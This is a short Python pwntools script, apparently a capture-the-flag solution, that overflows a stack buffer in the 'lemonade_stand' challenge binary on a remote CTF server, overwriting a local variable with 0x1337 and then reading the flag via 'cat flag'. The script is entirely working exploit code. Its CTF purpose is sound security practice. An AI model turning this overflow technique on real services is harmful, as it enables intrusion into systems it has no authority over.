#!/usr/bin/env python3
from pwn import *

# From checksec:
# Stack:      No canary found   =>  buffer overflow vulnerability is present
# PIE:        PIE enabled       =>  addresses are randomized, so we need to leak an address to calculate offsets

# OBJECTIVE: The goal here is to overwrite the "target" local variable with the value 0x1337.

context.binary = elf = ELF('./lemonade_stand', checksec=False)
OFFSET_TO_TARGET_VARIABLE = 76

p = remote("offsec.m0lecon.it", 13509)

p.recvuntil(b"price:")

payload = flat(
    b"A"*OFFSET_TO_TARGET_VARIABLE,
    p32(0x1337)     # p32() serves to write the desired 4 bytes in order to overwrite the "int target" variable
)

p.sendline(payload)

p.sendline(b"cat flag")

p.interactive()
